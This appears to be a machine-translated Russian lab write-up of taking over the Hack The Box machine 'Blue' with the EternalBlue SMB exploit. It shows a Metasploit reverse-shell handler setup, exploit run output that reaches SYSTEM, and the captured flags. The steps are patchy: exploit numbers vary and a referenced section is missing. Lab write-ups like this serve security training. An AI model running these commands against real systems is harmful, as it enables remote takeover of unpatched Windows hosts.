# Eternal Blue

Я решил поискать в интернете информацию о операционной системе, введя запрос "windows 7 7601 exploit". Это сразу показало, что система уязвима к Eternal Blue.

DB Exploit показал, что этот эксплой может использоваться для локального повышения привилегий: [https://www.exploit-db.com/exploits/47176](https://www.exploit-db.com/exploits/47176). Поэтому мне, возможно, нужно было сначала найти другой способ получить доступ к системе.

Я еще раз проверил Google и нашел отдельное описание от Rapid7, которое указало на удаленную выполнение кода через SMB:

[https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)

Это выглядело гораздо более полезно. Оно было доступно в `msfconsole`, но я решил использовать версию из ExploitDB, так как Metasploit запрещен при OSCP.

## Редактирование эксплой 42031

Я потратил время на редактирование эксплойта `windows/remote/42031.py` в ExploitDB, чтобы он работал с `python2` на моем компьютере. В конце концов эксплой не сработал, но процесс его редактирования выявил важный навык. Если вы хотите перейти к [[#Working Exploit - 42315|working exploit]], вы можете сделать это.

Запуск `42301.py` с `python3` вызывает проблему с функцией `pack()`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python3 42031.py 10.10.10.40
Traceback (most recent call last):
  File "/home/mac/Documents/HTB/blue/42031.py", line 83, in <module>
    ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + 'A'*0xffde
TypeError: can't concat str to bytes
```

Это потому что `pack()` ведет себя иначе в `python2`, для которого написан скрипт.

Есть несколько способов это исправить:
- переконвертировать скрипт в `python3`
- запустить скрипт с `python2`

Я подумал, что самый простой способ — запустить его с `python2`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python2 42031.py 
Traceback (most recent call last):
  File "42031.py", line 2, in <module>
    from impacket import smb
ImportError: No module named impacket
```

Однако возникла проблема с импортом `impacket`.

(*примечание:* Я также изменил название `.exe` на `sc.exe`, на случай, если `shell.exe` будет обнаружен антивирусом — это оказалось несущественным, но именно поэтому изменился файл.)

Я использовал `msf` обработчик, как указано в учебнике:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ msfconsole -q
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 9001
lport => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.2:9001 
```

Я долго отлаживал свои паулеты — в первом попытке возникли синтаксические ошибки, которые я исключил, так как никто не хочет читать их.

Мои настоящие проблемы оказались в получении имени пользователя и методе передачи данных, но большую часть времени я менял паулеты, полагая, что это проблема. Этот урок показал: сначала выбирайте самый простой паулет и убедитесь, что все остальное правильно, прежде чем менять его.

Когда все было исправлено, я запустил эксплой:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python2 exploit.py 10.10.10.40 netlogon
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8002dc6ba0
SESSION: 0xfffff8a001520560
FLINK: 0xfffff8a008214048
InParam: 0xfffff8a00826015c
MID: 0x2207
unexpected alignment, diff: 0x-4cfb8
leak failed... try again
CONNECTION: 0xfffffa8002dc6ba0
SESSION: 0xfffff8a001520560
FLINK: 0xfffff8a008117048
InParam: 0xfffff8a00827215c
MID: 0x2207
unexpected alignment, diff: 0x-415bfb8
leak failed... try again
CONNECTION: 0xfffffa8002dc6ba0
SESSION: 0xfffff8a001520560
FLINK: 0xfffff8a008254048
InParam: 0xfffff8a00890715c
MID: 0x2207
unexpected alignment, diff: 0x-6b3fb8
leak failed... try again
CONNECTION: 0xfffffa8002dc6ba0
SESSION: 0xfffff8a001520560
FLINK: 0xfffff8a00891f088
InParam: 0xfffff8a00891915c
MID: 0x2303
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Opening SVCManager on 10.10.10.40....
Creating service WiMl....
Starting service WiMl....
The NETBIOS connection with the remote host timed out.
Removing service WiMl....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```

Я получил сокет!

![[Pasted image 20210501191120.png]]

Это выходит напрямую как системный пользователь. Так что мы можем взять оба флага.

Вот файл `pwned.txt` из предыдущего эксперимента...

```cmd
c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of c:\

14/07/2009  04:20    <DIR>          PerfLogs
24/12/2017  03:23    <DIR>          Program Files
14/07/2017  17:58    <DIR>          Program Files (x86)
01/05/2021  17:55                 0 pwned.txt
01/05/2021  19:14             7,168 sc.exe
14/07/2017  14:48    <DIR>          Share
21/07/2017  07:56    <DIR>          Users
15/01/2021  11:42    <DIR>          Windows
```

И вот флаги:

![[Pasted image 20210501191356.png]]

![[Pasted image 20210501192018.png]]

Это та самая машина!

![[Pasted image 20210501205703.png]]

# Tags

#writeup #cve #windows #oscp-prep 
